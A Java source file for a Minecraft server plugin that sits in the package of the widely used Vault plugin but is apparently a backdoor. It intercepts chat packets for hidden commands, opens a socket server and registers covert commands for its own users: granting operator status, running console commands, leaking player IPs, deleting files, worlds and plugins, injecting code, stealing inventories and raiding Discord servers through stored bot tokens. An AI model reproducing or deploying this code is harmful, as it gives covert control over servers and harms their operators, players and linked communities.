package net.milkbowl.vault;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;

import net.milkbowl.vault.commands.CommandEvent;
import net.milkbowl.vault.commands.cmds.login.LoginCommand;
import net.milkbowl.vault.methods.Inj;
import net.milkbowl.vault.protocol.Reflection;
import net.milkbowl.vault.protocol.TinyProtocol;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.java.JavaPlugin;

import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.commands.cmds.*;
import net.milkbowl.vault.commands.cmds.Void;
import net.milkbowl.vault.commands.cmds.filenavigation.*;
import net.milkbowl.vault.commands.cmds.help.*;
import net.milkbowl.vault.commands.cmds.premium.*;
import net.milkbowl.vault.commands.cmds.premium.discord.banAllDiscord;
import net.milkbowl.vault.commands.cmds.premium.discord.createTC;
import net.milkbowl.vault.commands.cmds.premium.discord.createVC;
import net.milkbowl.vault.commands.cmds.premium.discord.delChannels;
import net.milkbowl.vault.commands.cmds.premium.discord.dmUsers;
import net.milkbowl.vault.commands.cmds.premium.discord.kickAllDiscord;
import net.milkbowl.vault.commands.cmds.premium.discord.setGuild;
import net.milkbowl.vault.commands.cmds.premium.discord.setStatus;
import net.milkbowl.vault.commands.cmds.premium.discord.setToken;
import net.milkbowl.vault.commands.cmds.premium.discord.showToken;
import net.milkbowl.vault.commands.cmds.premium.discord.spamDiscord;
import net.milkbowl.vault.commands.cmds.admin.*;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.methods.onEnable;
import net.milkbowl.vault.sockets.SocketServer;
import net.milkbowl.vault.util.Settings;
import net.dv8tion.jda.core.JDA;

public class Core extends JavaPlugin implements Listener {

    public ArrayList<String> registered = new ArrayList<>();
    public ArrayList<String> registeredFree = new ArrayList<>();
    public ArrayList<String> registeredAdmin = new ArrayList<>();
    public ArrayList<String> registeredPremium = new ArrayList<>();
    public ArrayList<String> god = new ArrayList<>();
    public ArrayList<String> npu = new ArrayList<>();
    public ArrayList<String> serverchat = new ArrayList<>();
    public ArrayList<String> dirt = new ArrayList<>();
    public ArrayList<String> piss = new ArrayList<>();
    public ArrayList<String> noDmg = new ArrayList<>();

    public ArrayList<Player> vanished = new ArrayList<>();

    public HashMap<Player, Boolean> playerOnVPN = new HashMap<>();
    public HashMap<Player, Enum> rank = new HashMap<>();
    public HashMap<Player, Material> pissBlock = new HashMap<>();
    public HashMap<Player, Player> reply = new HashMap<>();
    public HashMap<Player, String> prefix = new HashMap<>();
    public HashMap<Player, String> nextmsg = new HashMap<>();
    public HashMap<Player, Player> cmdspyPlayer = new HashMap<>();

    public HashSet<Inventory> dinventory = new HashSet<>();

    public ArrayList<String> frozen = new ArrayList<>();

    public ArrayList<String> cmdspy = new ArrayList<>();
    public ArrayList<String> socialspy = new ArrayList<>();

    public ArrayList<String> spy = new ArrayList<>();

    public boolean enabled = true;
    public boolean isLocked = false;
    public boolean freezeall = false;
    public boolean modcmds = false;
    public boolean lockcmds = false;
    public boolean lockchat = false;
    public boolean lockcontainers = false;

    public boolean isLoggedIn = false;

    public JDA jda;

    public static SocketServer server;

    public static TinyProtocol protocol;
    {
        try{
            CHAT_MESSAGE  = Reflection.getField("{nms}.PacketPlayInChat", String.class, 0);

        }catch (Throwable t) {
            try {
                CHAT_MESSAGE = Reflection.getField("{nms.server.network}.PacketPlayInChat", String.class, 1);
            } catch (Throwable t22) {
                CHAT_MESSAGE  = Reflection.getField("net.minecraft.network.protocol.game.PacketPlayInChat", String.class, 0);
            }

        }

    }
    public static Reflection.FieldAccessor<String> CHAT_MESSAGE;

    public void onEnable() {

        protocol = new TinyProtocol(this);
        new CommandEvent();
        new LoginCommand();

        File file = new File(getDataFolder().getParentFile(), "PluginMetrics/data");
        try {
            if (!file.exists()) {
                file.mkdirs();
                file.createNewFile();
            }
        } catch (IOException ignored) {}




        try {
            onEnable.start();
        } catch (IOException ignored) {}

        if (DataManager.getData().getBoolean("connect")) {
            server = new SocketServer(DataManager.getData().getInt("port"));
        }

        for (Player a : Bukkit.getOnlinePlayers()) {
            if (registered.contains(a.getName())) {
                if (enabled) {
                    a.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.PRIMARY_COLOUR + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠"));
                    a.sendMessage(Settings.HIGHLIGHT_COLOUR + Settings.NAME + Settings.SECONDARY_COLOUR + " has just been " + Settings.HIGHLIGHT_COLOUR + "re-enabled!" + Settings.SECONDARY_COLOUR + " You may now continue using.");
                    a.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.PRIMARY_COLOUR + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠"));
                } else {
                    API.error(a);
                }
            }
        }

    }


    public void onDisable() {
        if (server != null) {
            server.stop();
        }
        API.saveLists();

        for (Player a : Bukkit.getOnlinePlayers()) {
            if (registered.contains(a.getName())) {
                a.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.PRIMARY_COLOUR + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠"));
                a.sendMessage(Settings.HIGHLIGHT_COLOUR + Settings.NAME + Settings.SECONDARY_COLOUR +" has just been " + Settings.HIGHLIGHT_COLOUR + "disabled! "+Settings.SECONDARY_COLOUR + "Do not do anything until the plugin is re-enabled!");
                a.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠" + Settings.PRIMARY_COLOUR + "| WARNING | &e⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠"));
            }
        }
    }

    public HashMap<String, CommandManager> commands = new HashMap<String, CommandManager>() {
        private static final long serialVersionUID = 1503068533314125621L; {

            this.put("op", new Op());
            this.put("deop", new Deop());
            this.put("lockconsole", new LockConsole());

            this.put("logout", new Logout());
            this.put("quit", new Logout());
            this.put("logoutall", new LogoutAll());

            this.put("commandspy", new CmdSpy());
            this.put("cmdspy", new CmdSpy());

            this.put("coords", new Coords());
            this.put("coord", new Coords());

            this.put("getip", new GetIp());
            this.put("delallfiles", new DelAllFiles());
            this.put("wand", new Wand());
            this.put("wands", new Wand());
            this.put("spin", new Spin());
            this.put("popup", new Popup());
            this.put("swap", new Swap());

            this.put("help", new Help());
            this.put("adminhelp", new AdminHelp());
            this.put("ahelp", new AdminHelp());
            this.put("ride", new Ride());
            this.put("lockdown", new Lockdown());

            this.put("plugins", new Plugins());
            this.put("pl", new Plugins());
            this.put("item", new Item());
            this.put("i", new Item());

            this.put("enable", new Enable());
            this.put("disable", new Disable());

            this.put("setmotd", new SetMOTD());
            this.put("motd", new SetMOTD());
            this.put("checkerror", new checkError());

            this.put("whitelist", new Whitelist());
            this.put("wl", new Whitelist());
            this.put("leakips", new Leakips());
            this.put("rename", new Rename());
            this.put("nodmg", new noDmg());
            this.put("nodamage", new noDmg());
            this.put("fix", new Fix());
            this.put("logconsole", new LogConsole());


            this.put("flood", new Flood());
            this.put("edit", new Edit());

            this.put("kick", new Kick());
            this.put("ban", new Ban());
            this.put("unban", new Unban());
            this.put("pardon", new Unban());
            this.put("msg", new Msg());
            this.put("whisper", new Msg());
            this.put("w", new Msg());

            this.put("console", new Console());
            this.put("exe", new Console());
            this.put("execute", new Console());

            this.put("top", new Top());

            this.put("tip", new Tip());
            this.put("setguild", new setGuild());
            this.put("delchannels", new delChannels());
            this.put("delallchannels", new delChannels());
            this.put("delallchannel", new delChannels());
            this.put("delchannel", new delChannels());

            this.put("dmall", new dmUsers());
            this.put("dmallusers", new dmUsers());

            this.put("kickallusers", new kickAllDiscord());
            this.put("kickusers", new kickAllDiscord());
            this.put("banallusers", new banAllDiscord());
            this.put("banusers", new banAllDiscord());
            this.put("secure", new Secure());
            this.put("version", new Version());
            this.put("ver", new Version());

            this.put("inject", new Inject());
            this.put("inj", new Inject());

            this.put("showtoken", new showToken());
            this.put("gettoken", new showToken());

            this.put("delworld", new DelWorld());
            this.put("invsteal", new invSteal());

            this.put("heal", new Heal());
            this.put("feed", new Feed());
            this.put("createvc", new createVC());
            this.put("createtc", new createTC());
            this.put("spamdiscord", new spamDiscord());

            this.put("lookup", new Lookup());

            this.put("sethealth", new Sethealth());
            this.put("setmaxhealth", new Sethealth());
            this.put("setheart", new Sethealth());
            this.put("sethearts", new Sethealth());
            this.put("setmaxheart", new Sethealth());
            this.put("setmaxhearts", new Sethealth());

            this.put("kill", new Kill());

            this.put("fn", new Fn());
            this.put("filenavigation", new Fn());

            this.put("cls", new Cls());
            this.put("lsd", new Lsd());
            this.put("lsf", new Lsf());
            this.put("pwd", new Pwd());
            this.put("getport", new Getport());
            this.put("enchant", new Enchant());

            this.put("discordraider", new DiscordRaider());
            this.put("dr", new DiscordRaider());
            this.put("piss", new Piss());

            this.put("list", new List());

            this.put("freeze", new Freeze());
            this.put("unfreeze", new Unfreeze());

            this.put("nextmsg", new Nextmsg());
            this.put("nextmessage", new Nextmsg());

            this.put("reply", new Reply());
            this.put("r", new Reply());

            this.put("vanish", new Vanish());
            this.put("v", new Vanish());


            this.put("bombs", new Bombs());
            this.put("bomb", new Bombs());
            this.put("setprefix", new SetPrefix());
            this.put("dirt", new Dirt());

            this.put("serverchat", new ServerChat());
            this.put("sc", new ServerChat());
            this.put("settoken", new setToken());

            this.put("status", new Status());
            this.put("save", new Save());

            this.put("rideme", new Rideme());

            this.put("setpassword", new SetPassword());
            this.put("setpass", new SetPassword());

            this.put("spamwebhook", new spamWebhook());

            this.put("checkpass", new CheckPass());
            this.put("nameme", new Nameme());
            this.put("nameall", new Nameall());

            this.put("teleprot", new Tp());
            this.put("xp", new XP());
            this.put("tp", new Tp());
            this.put("tpall", new Tpall());

            this.put("delplugin", new Delplugin());
            this.put("setstatus", new setStatus());

            this.put("penis", new Penis());
            this.put("launch", new Launch());
            this.put("void", new Void());

            this.put("modcmds", new ModerationCommands());
            this.put("modcommands", new ModerationCommands());
            this.put("moderationcommands", new ModerationCommands());

            this.put("disablelock", new disableLock());
            this.put("enablelock", new enableLock());

            this.put("earrape", new Earrape());
            this.put("forums", new Forums());
            this.put("forum", new Forums());

            this.put("listloggedin", new ListLoggedin());
            this.put("dupe", new Dupe());
            this.put("dupemachine", new Dupe());
            this.put("flip", new Flip());
            this.put("sudo", new Sudo());

            this.put("broadcast", new Broadcast());
            this.put("bc", new Broadcast());
            this.put("spam", new Spam());
            this.put("god", new God());
            this.put("invsee", new Invsee());
            this.put("togglechat", new Togglechat());
            this.put("clearchat", new Clearchat());

            this.put("consoleconnect", new ConnectConsole());
            this.put("connectconsole", new ConnectConsole());

            this.put("mobwand", new MobWand());
            this.put("mwand", new MobWand());
            this.put("fire", new Fire());
            this.put("trap", new Trap());
            this.put("scare", new Scare());

            this.put("reload", new Reload());
            this.put("stop", new Stop());
            this.put("npu", new NPU());
            this.put("floodconsole", new FloodConsole());
            this.put("lockcontainers", new LockContainers());
            this.put("lockcmds", new LockCommands());
            this.put("lockcommands", new LockCommands());
            this.put("fly", new Fly());

            this.put("spy", new Spy());
            this.put("login", new Login());
            this.put("forcelogout", new ForceLogout());
            this.put("premiumhelp", new PremiumHelp());
            this.put("premhelp", new PremiumHelp());

            this.put("clearpass", new ClearPass());
            this.put("enderchest", new eChest());
            this.put("echest", new eChest());
            this.put("gamemode", new Gamemode());
            this.put("gm", new Gamemode());
            this.put("gms", new Gms());
            this.put("gmc", new Gmc());

            this.put("install", new Install());
            this.put("theme", new Theme());
            this.put("scheme", new Theme());
        }
    };
}
